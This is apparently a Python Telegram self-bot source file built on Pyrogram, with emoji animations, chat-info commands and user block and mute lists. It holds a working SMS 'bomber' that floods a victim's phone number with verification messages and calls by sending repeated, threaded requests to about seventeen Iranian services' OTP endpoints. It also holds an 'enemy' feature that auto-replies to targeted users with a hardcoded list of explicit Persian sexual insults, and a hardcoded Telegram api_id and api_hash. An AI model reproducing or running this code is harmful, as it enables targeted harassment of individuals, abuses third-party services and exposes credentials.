#+++ All code By Purea
from apscheduler.schedulers.asyncio import AsyncIOScheduler
import random, asyncio, pytz
from datetime import datetime
from os import *
from time import *
from json import *
from pyrogram import *
from requests import *
from threading import Thread
from pyrogram.types import *
from pyrogram.errors import *
from pyrogram.enums import *





#List
target, muute, game, type, list_fosh, status_time = [], [], ["off"], ["off"], ["کص مادرت", "کص ابجیت", "الهی مادرت بمیره", "کیر 47 سانتیم با کاندوم صاف به سوی کص مادرت", "تو پسر من هستی", "کیر فیل به کص مادرت", "خایه های شوهر عمت تو کص مادرت", "مادرجنده", "مادرقحبه", "کص مادرت", "خارکصه", "مادرتو گاییدم", "مادرتو سفت سفت خوردم", "کص زن عموی مادرجندت ، مادرکسته", "خارکسده", "کیر کاکا امام خمینی ساف تو کص ام الفامیلات", "الحق کص مادرت", "سلام مادرکسته", "کص خواهرت"], ['off']
app = Client("ThePurea" , api_id = "5888972" , api_hash = "8c6c75ac3bb436c548e56e93020cb738")






@app.on_message(filters.me & filters.regex('(?i)^قلب$'))
async def hert(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "`❤️`")
    await asyncio.sleep(1.6)
    await app.edit_message_text(chat_id, msg_id, "`💙`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💜`‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`❤`️‌")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`💐`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "️‌`🌹`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "`🥀‌`")
    await asyncio.sleep(1.2)
    await app.edit_message_text(chat_id, msg_id, "**i LoVe YoU**‌")




@app.on_message(filters.me & filters.regex('(?i)^بکیرم$'))
async def bk(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    bk1 = "\n😂😂😂          😂         😂\n😂         😂      😂       😂\n😂           😂    😂     😂\n😂        😂       😂   😂\n😂😂😂          😂😂\n😂         😂      😂   😂\n😂           😂    😂      😂\n😂           😂    😂        😂\n😂        😂       😂          😂\n😂😂😂          😂            😂\n"
    bk2 = "\n🤤🤤🤤          🤤         🤤\n🤤         🤤      🤤       🤤\n🤤           🤤    🤤     🤤\n🤤        🤤       🤤   🤤\n🤤🤤🤤          🤤🤤\n🤤         🤤      🤤   🤤\n🤤           🤤    🤤      🤤\n🤤           🤤    🤤        🤤\n🤤        🤤       🤤          🤤\n🤤🤤🤤          🤤            🤤\n"
    bk3 = "\n💩💩💩          💩         💩\n💩         💩      💩       💩\n💩           💩    💩     💩\n💩        💩       💩   💩\n💩💩💩          💩💩\n💩         💩      💩   💩\n💩           💩    💩      💩\n💩           💩    💩        💩\n💩        💩       💩          💩\n💩💩💩          💩            💩\n"
    bk4 = "\n🌹🌹🌹          🌹         🌹\n🌹         🌹      🌹       🌹\n🌹           🌹    🌹     🌹\n🌹        🌹       🌹   🌹\n🌹🌹🌹          🌹🌹\n🌹         🌹      🌹   🌹\n🌹           🌹    🌹      🌹\n🌹           🌹    🌹        🌹\n🌹        🌹       🌹          🌹\n🌹🌹🌹          🌹            🌹\n"
    bk5 = "\n💀💀💀          💀         💀\n💀         💀      💀       💀\n💀           💀    💀     💀\n💀        💀       💀   💀\n💀💀💀          💀💀\n💀         💀      💀   💀\n💀           💀    💀      💀\n💀           💀    💀        💀\n💀        💀       💀          💀\n💀💀💀          💀            💀\n"
    bk6 = "\n🌑🌑🌑          🌑         🌑\n🌑         🌑      🌑       🌑\n🌑           🌑    🌑     🌑\n🌑        🌑       🌑   🌑\n🌑🌑🌑          🌑🌑\n🌑         🌑      🌑   🌑\n🌑           🌑    🌑      🌑\n🌑           🌑    🌑        🌑\n🌑        🌑       🌑          🌑\n🌑🌑🌑          🌑            🌑\n"
    bk7 = "\n🌒🌒🌒          🌒         🌒\n🌒         🌒      🌒       🌒\n🌒           🌒    🌒     🌒\n🌒        🌒       🌒   🌒\n🌒🌒🌒          🌒🌒\n🌒         🌒      🌒   🌒\n🌒           🌒    🌒      🌒\n🌒           🌒    🌒        🌒\n🌒        🌒       🌒          🌒\n🌒🌒🌒          🌒            🌒\n"
    bk8 = "\n🌓🌓🌓          🌓         🌓\n🌓         🌓      🌓       🌓\n🌓           🌓    🌓     🌓\n🌓        🌓       🌓   🌓\n🌓🌓🌓          🌓🌓\n🌓         🌓      🌓   🌓\n🌓           🌓    🌓      🌓\n🌓           🌓    🌓        🌓\n🌓        🌓       🌓          🌓\n🌓🌓🌓          🌓            🌓\n"
    bk9 = "\n🌔🌔🌔          🌔         🌔\n🌔         🌔      🌔       🌔\n🌔           🌔    🌔     🌔\n🌔        🌔       🌔   🌔\n🌔🌔🌔          🌔🌔\n🌔         🌔      🌔   🌔\n🌔           🌔    🌔      🌔\n🌔           🌔    🌔        🌔\n🌔        🌔       🌔          🌔\n🌔🌔🌔          🌔            🌔\n"
    bk10 = "\n🌕🌕🌕          🌕         🌕\n🌕         🌕      🌕       🌕\n🌕           🌕    🌕     🌕\n🌕        🌕       🌕   🌕\n🌕🌕🌕          🌕🌕\n🌕         🌕      🌕   🌕\n🌕           🌕    🌕      🌕\n🌕           🌕    🌕        🌕\n🌕        🌕       🌕          🌕\n🌕🌕🌕          🌕            🌕\n"
    bk11 = "\n🌖🌖🌖          🌖         🌖\n🌖         🌖      🌖       🌖\n🌖           🌖    🌖     🌖\n🌖        🌖       🌖   🌖\n🌖🌖🌖          🌖🌖\n🌖         🌖      🌖   🌖\n🌖           🌖    🌖      🌖\n🌖           🌖    🌖        🌖\n🌖        🌖       🌖          🌖\n🌖🌖🌖          🌖            🌖\n"
    bk12 = "\n🌗🌗🌗          🌗         🌗\n🌗         🌗      🌗       🌗\n🌗           🌗    🌗     🌗\n🌗        🌗       🌗   🌗\n🌗🌗🌗          🌗🌗\n🌗         🌗      🌗   🌗\n🌗           🌗    🌗      🌗\n🌗           🌗    🌗        🌗\n🌗        🌗       🌗          🌗\n🌗🌗🌗          🌗            🌗\n"
    bk13 = "\n🌘🌘🌘          🌘         🌘\n🌘         🌘      🌘       🌘\n🌘           🌘    🌘     🌘\n🌘        🌘       🌘   🌘\n🌘🌘🌘          🌘🌘\n🌘         🌘      🌘   🌘\n🌘           🌘    🌘      🌘\n🌘           🌘    🌘        🌘\n🌘        🌘       🌘          🌘\n🌘🌘🌘          🌘            🌘\n"
    bk14 = "\n🌙🌙🌙          🌙         🌙\n🌙         🌙      🌙       🌙\n🌙           🌙    🌙     🌙\n🌙        🌙       🌙   🌙\n🌙🌙🌙          🌙🌙\n🌙         🌙      🌙   🌙\n🌙           🌙    🌙      🌙\n🌙           🌙    🌙        🌙\n🌙        🌙       🌙          🌙\n🌙🌙🌙          🌙            🌙\n"
    bk15 = "\n🪐🪐🪐          🪐         🪐\n🪐         🪐      🪐       🪐\n🪐           🪐    🪐     🪐\n🪐        🪐       🪐   🪐\n🪐🪐🪐          🪐🪐\n🪐         🪐      🪐   🪐\n🪐           🪐    🪐      🪐\n🪐           🪐    🪐        🪐\n🪐        🪐       🪐          🪐\n🪐🪐🪐          🪐            🪐\n"
    await app.edit_message_text(chat_id, msg_id, bk1)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk2)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk3)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk4)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk5)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk6)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk7)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk8)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk9)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk10)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk11)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk12)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk13)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk14)
    await asyncio.sleep(1.5)
    await app.edit_message_text(chat_id, msg_id, bk15)





@app.on_message(filters.me & filters.regex('(?i)^وایسا$'))
async def download_picture(client, message):
    url = await app.download_media(message.reply_to_message.photo.file_id)
    await app.send_photo("me", url, caption=str("@"+message.reply_to_message.from_user.username))
    remove(url)




@app.on_message(filters.me & filters.regex('(?i)^pv$'))
async def pv(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    info = await app.get_users(chat_id)
    text = f"""
+ **CHAT_ID** : `{info.id}`
+ **USERNAME** : @`{info.username}`
+ **DATABASE** : `{info.dc_id}`
"""
    await app.edit_message_text(chat_id, msg_id, str(text))





@app.on_message(filters.me & filters.regex('(?i)^Ping$'))
async def ping(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, f"**<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name} is online 🗿**.</a>")






@app.on_message(filters.me & filters.regex('(?i)^دشمن$'))
async def enemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    await app.block_user(user_id)
    target.append(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🦋 user <a href='tg://user?id={user_id}'>{name}</a> is added to enemy List**.")





@app.on_message(filters.me & filters.regex('(?i)^حذف دشمن$'))
async def unenemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    target.remove(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🕷️ user <a href='tg://user?id={user_id}'>{name}</a> is delete from enemy List.**")





@app.on_message(filters.me & filters.regex('(?i)^لیست دشمن$'))
async def list_enemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "لیست دشمن بر اساس ایدی عددی : \n\n"+str(target))




@app.on_message(filters.me & filters.regex('(?i)^پاکسازی لیست دشمن$'))
async def delete_list_enemy(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    for user_id in target:
        await app.unblock_user(user_id)
    target.clear()
    await app.edit_message_text(chat_id, msg_id, "**لیست دشمن ربات پاکسازی شد.**")





@app.on_message(filters.me & filters.regex('(?i)^سکوت$'))
async def mute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    muute.append(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🕊️ user <a href='tg://user?id={user_id}'>{name}</a> is added to mute List.**")




@app.on_message(filters.me & filters.regex('(?i)^حذف سکوت$'))
async def unmute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    user_id = message.reply_to_message.from_user.id
    name = message.reply_to_message.from_user.first_name
    muute.remove(user_id)
    await app.edit_message_text(chat_id, msg_id, f"**🌹 user <a href='tg://user?id={user_id}'>{name}</a> is delete from mute List.**")




async def change_time_profile():
    if status_time[0] == 'on':
        fonts = [{"0":"Ѳ","1":"❶","2":"❷","3":"❸","4":"❹","5":"❺","6":"❻","7":"❼","8":"❽","9":"❾"}, {"0":"𝟘","1":"𝟙","2":"𝟚","3":"𝟛","4":"𝟜","5":"𝟝","6":"𝟞","7":"𝟟","8":"𝟠","9":"𝟡"}]
        country_time_zone = pytz.timezone('Asia/Tehran')
        country_time = datetime.now(country_time_zone)
        time = country_time.strftime("%H:%M")
        gg = time.translate(str.maketrans(random.choice(fonts)))
        await app.update_profile(bio=gg)
    else:
        ThePurea = 'ThePurea'





@app.on_message(filters.me & filters.regex('(?i)^لیست سکوت$'))
async def list_mute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, "💻 لیست سکوت بر اساس ایدی عددی : \n\n"+str(muute))





@app.on_message(filters.me & filters.regex('(?i)^پاکسازی لیست سکوت$'))
async def delete_list_mute(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    muute.clear()
    await app.edit_message_text(chat_id, msg_id, "**🍌 لیست سکوت ربات پاکسازی شد.**")





@app.on_message(filters.me & filters.regex('(?i)^راهنما$'))
async def help(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    help = """
🎀 `بکیرم`
🎀 `قلب`

🗿 `دشمن`
🗿 `حذف دشمن`
🗿 `پاکسازی لیست دشمن`
🗿 `لیست دشمن`

🏳️‍🌈 `سکوت`
🏳️‍🌈 `حذف سکوت`
🏳️‍🌈 `پاکسازی لیست سکوت`
🏳️‍🌈 `لیست سکوت`

🥂 `gp`
🥂 `pv`
🥂 `bomber 2 `0912€€€$$√√
🥂 `وایسا`
🥂 `ساعت روشن/خاموش`

🤖 `تایپینگ روشن`
🤖 `تایپینگ خاموش`
🔥 `گیمینگ روشن`
🔥 `گیمینگ خاموش`
🍌 `وضعیت کسکشی`
"""
    await app.edit_message_text(chat_id, msg_id, help)






@app.on_message(filters.me & filters.regex('(?i)^gp$'))
async def gp(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    info = await app.get_chat(chat_id)
    text = f"""
+ **CHAT_ID** : `{info.id}`
+ **COUNT** : `{info.members_count}`
+ **NAME** : `{info.title}`
+ **INVITE LINK** : `{info.invite_link}`
"""
    await app.edit_message_text(chat_id, msg_id, str(text))




@app.on_message(filters.me & filters.regex('(?i)^وضعیت کسکشی$'))
async def status_action(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    await app.edit_message_text(chat_id, msg_id, f"""**وضعیت کسکشی اکانت برای حالت تایپینگ و بازی کردن به روایت زیر :

🤪 typing : `{type[0]}`
🥺 gaming : `{game[0]}`

**""")



@app.on_message(filters.me & filters.regex('(?i)^تایپینگ روشن$'))
async def action_type_on(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("off")
    type.append("on")
    await app.edit_message_text(chat_id, msg_id, "**🤖 type action new online.! 🤖**")



@app.on_message(filters.me & filters.regex('(?i)^تایپینگ خاموش$'))
async def action_type_off(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("off")
    type.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🤖 type action new offline.! 🤖**")



@app.on_message(filters.me & filters.regex('(?i)^گیمینگ روشن$'))
async def action_game_on(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("on")
    type.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🔥 game action new online.! 🔥**")



@app.on_message(filters.me & filters.regex('(?i)^گیمینگ خاموش$'))
async def action_game_off(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    type.clear()
    game.clear()
    game.append("off")
    type.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🔥 game action new offline.! 🔥**")




@app.on_message(filters.me & filters.regex('(?i)^ساعت روشن$'))
async def change_status_time(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    status_time.clear()
    status_time.append("on")
    await app.edit_message_text(chat_id, msg_id, "**🔥 ساعت روشن شد 🔥**")





@app.on_message(filters.me & filters.regex('(?i)^ساعت خاموش$'))
async def change_status_time2(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    status_time.clear()
    status_time.append("off")
    await app.edit_message_text(chat_id, msg_id, "**🔥 ساعت خاموش شد 🔥**")



@app.on_message(filters.me & filters.regex('bomber'))
async def bomber(client, message):
    msg_id = message.id
    chat_id = message.chat.id
    text = message.text.split()
    phone = str(text[1])
    number = str(text[2])
    if "09" in number:
        for kos in range(int(phone)):
            Thread(target=sventtubf, args=[number]).start()
            Thread(target=one, args=[number]).start()
            Thread(target=two, args=[number]).start()
            Thread(target=tree, args=[number]).start()
            Thread(target=fwor, args=[number]).start()
            Thread(target=five, args=[number]).start()
            Thread(target=six, args=[number]).start()
            Thread(target=seven, args=[number]).start()
            Thread(target=eyit, args=[number]).start()
            Thread(target=niyne, args=[number]).start()
            Thread(target=ten, args=[number]).start()
            Thread(target=eleven, args=[number]).start()
            Thread(target=tovelf, args=[number]).start()
            Thread(target=therty, args=[number]).start()
            Thread(target=forty, args=[number]).start()
            Thread(target=fifty, args=[number]).start()
            Thread(target=sixty, args=[number]).start()
            await asyncio.sleep(5)
        await app.edit_message_text(chat_id, msg_id, f"**{phone} sms sended.**")
    else:
        await app.edit_message_text(chat_id, msg_id, f"**🗿 error.**")







@app.on_message(filters.me)
async def me(client, message):
    chat_id = message.chat.id
    if str(game[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.PLAYING)
    elif str(type[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.TYPING)
    else:
        cr = "@ThePurea"




@app.on_message(filters.private)
async def filters_pv(client, message):
    chat_id = message.chat.id
    if str(game[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.PLAYING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    elif str(type[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.TYPING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    else:
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
        cr = "@ThePurea"




@app.on_message(filters.group)
async def filters_group(client, message):
    chat_id = message.chat.id
    if str(game[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.PLAYING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    elif str(type[0]) == "on":
        await app.send_chat_action(chat_id, enums.ChatAction.TYPING)
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
    else:
        msg_id = message.id
        chat_id = message.chat.id
        if message.from_user.id in target:
            text = list_fosh[random.randrange(len(list_fosh))]
            await message.reply_text(text)
        elif message.from_user.id in muute:
            await app.delete_messages(chat_id, msg_id, revoke=True)
        cr = "@ThePurea"











def one(number):
    a = "http://app.insatel.ir/client_webservices.php"
    b = f"ac=10&appname=fk&phonenumber={number}&token=mw0yDKRVld&serial=null&keyname=verify2"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "85","Host": "app.insatel.ir","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def two(number):
    a = "http://setmester.com/mrfallowtel_glp/client_webservices4.php"
    b = f"ac=9&username=gyjoo8uyt&password=123456&fullname=hkurdds6&phonenumber={number}&token=1uhljuqBpI&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "110","Host": "setmester.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def tree(number):
    a = "http://jozamoza.com/com.cyberspaceservices.yb/client_webservices4.php"
    b = f"ac=9&username=sjwo7ehd&password=123456&fullname=dheoe9dy&phonenumber={number}&token=qqcI33qkGC&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "109","Host": "jozamoza.com","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def fwor(number):
    a = "https://api.nazdika.com/v3/account/request-login/"
    b = f"phone={number}"
    d = {"Accept": "Application/JSON","User-Agent": ",29;Xiaomi M90077J70CG;LTE","X-ODD-User-Agent": "Mozilla/9.0 (Linux; Android 10; M9007J540CG Build/QKQ1.97512.002; wv) AppleWebKit/9977.36 (KHTML, like Gecko) Version/4.0 Chrome/2000.0.4896.127 Mobile Safari/999.36","X-ODD-Operator": "IR-MCI,IR-MCI","X-ODD-SOURCE": "Nazdika-v-1140","X-ODD-MARKET": "googlePlay","X-ODD-IDENTIFIER": "null","X-ODD-ANDROID-ID": "lllllllllllll666llllllllll","Content-Type": "application/x-www-form-urlencoded","Content-Length": "17","Host": "api.nazdika.com","Connection": "Keep-Alive","Accept-Encoding": "gzip"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def five(number):
    a = "http://followmember2022.ir/followmember/client_webservices4.php"
    b = f"ac=10&phonenumber={number}&token=CLTRIcCmcT&serial=null"
    d = {"Content-Type": "application/x-www-form-urlencoded","Content-Length": "58","Host": "followmember2022.ir","Connection": "Keep-Alive","Accept-Encoding": "gzip","User-Agent": "okhttp/3.12.1"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def six(number):
    a = "https://iranstor1.ir/index.php/api/login?sms.ir"
    b = f"fullname=alimahmoodiu&mobile={number}&device_id=12365478911&token=c5aef1158542ea0932c1916f829d943c"
    d = {"Host": "iranstor1.ir","key": "d41d8cd98f00b204e9800998ecf8427e","apptoken": "VdOIvN6tHdgjNrmCr0PvSg==:NTU1ZDBhNGNiODY0NzgyNA==","content-type": "application/x-www-form-urlencoded","content-length": "115","accept-encoding": "gzip","cookie": "ci_session=181bfd8fd175d83b156a57e477afc7edbc703522","user-agent": "okhttp/3.5.0"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def seven(number):
    a = "https://homa.petabad.com/customer/signup"
    b = f"my_server_api_version=1&platform=android&my_app_type=android&my_app_version=17&time_zone_offset=270&app_name=customer&phone_number={number}"
    d = {"user-agent": "Dart/2.14 (dart:io)","content-type": "application/x-www-form-urlencoded; charset=utf-8","accept-encoding": "gzip","content-length": "142","host": "homa.petabad.com"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def eyit(number):
    a = "https://takhfifan.com/api/jsonrpc/1_0/"
    b = {"id":592419288011976410,"method":"customerExistOtp","params":["023804109885a10d02158eef65c5d887",{"username":number}]}
    d = {"Host": "takhfifan.com","x-session": "023804109885a10d02158eef65c5d887","content-type": "takhfifanApp/json","content-length": "126","accept-encoding": "gzip","user-agent": "okhttp/3.14.9"}
    try: 
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def niyne(number):
    a = "http://baharapp.xyz/api/v1.1/reqSMS.php"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "baharapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def ten(number):
    a = "http://serverpv1.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "serverpv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def eleven(number):
    a = "http://kolbeapp.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "kolbeapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def tovelf(number):
    a = "http://arezooapp.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "arezooapp.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def therty(number):
    a = "http://servermv1.xyz/api/v1/reqSMS"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "servermv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def forty(number):
    a = "https://core.otaghak.com/odata/Otaghak/Users/ReadyForLogin"
    b = {"userName":number}
    d = {"Host": "core.otaghak.com","app-version": "235","app-version-name": "5.12.0","app-client": "guest","device-model": "POCO M2007J20CG","device-sdk": "29","user-agent": "app:5.12.0(235)@POCO M2007J20CG","content-type": "application/json; charset=UTF-8","content-length": "26","accept-encoding": "gzip"}
    try:
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def fifty(number):
    a = "https://gharar.ir/api/v1/users/"
    b = {"phone":number}
    d = {"Host": "gharar.ir","appversion": "1.5.4","content-type": "application/json; charset=UTF-8","content-length": "23","accept-encoding": "gzip","user-agent": "okhttp/4.9.2"}
    try:
        r = post(a, json=b, headers=d)
    except:
        cr = "ThePurea"


def sixty(number):
    a = "http://serverhv1.xyz/api/v1.1/reqSMS.php"
    b = f"phone={number}&"
    d = {"Content-Type": "application/x-www-form-urlencoded","User-Agent": "Dalvik/2.1.0 (Linux; U; Android 100; M2007J208CG MIUI/V12.0.9.0.QJGMIXM)","Host": "serverhv1.xyz","Connection": "Keep-Alive","Accept-Encoding": "gzip","Content-Length": "18"}
    try:
        r = post(a, data=b, headers=d)
    except:
        cr = "ThePurea"


def sventtubf(number):
    get(f"https://cyclops.drnext.ir/v1/doctors/auth/check-doctor-exists-by-mobile?mobile={number}", headers={"Host": "cyclops.drnext.ir","accept-language": "fa","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br"})
    options("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", headers={"Host": "cyclops.drnext.ir","accept": "*/*","access-control-request-method": "POST","access-control-request-headers": "content-type","origin": "https://panel.drnext.ir","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","sec-fetch-mode": "cors","sec-fetch-site": "same-site","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"})
    post("https://cyclops.drnext.ir/v1/doctors/auth/send-verification-token", json={"mobile":number}, headers={"Host": "cyclops.drnext.ir","content-length": "24","accept": "application/json, text/plain, */*","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": ",gzip, deflate, br"})
    options("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", headers={"Host": "cyclops.drnext.ir","accept": "*/*","access-control-request-method": "POST","access-control-request-headers": "content-type","origin": "https://panel.drnext.ir","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","sec-fetch-mode": "cors","sec-fetch-site": "same-site","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br","accept-language": "en-GB,en-US;q=0.9,en;q=0.8,fa;q=0.7"})
    post("https://cyclops.drnext.ir/v1/doctors/auth/call-verification-token", json={"mobile":number}, headers={"Host": "cyclops.drnext.ir","content-length": "24","accept": "application/json, text/plain, */*","accept-language": "fa","user-agent": "Mozilla/5.0 (Linux; Android 10; M2007J20CG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json;charset=UTF-8","origin": "https://panel.drnext.ir","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://panel.drnext.ir/","accept-encoding": "gzip, deflate, br"})
    









scheduler = AsyncIOScheduler()
scheduler.add_job(change_time_profile, "interval", seconds=60)
scheduler.start()
app.run(print ('self is run...'))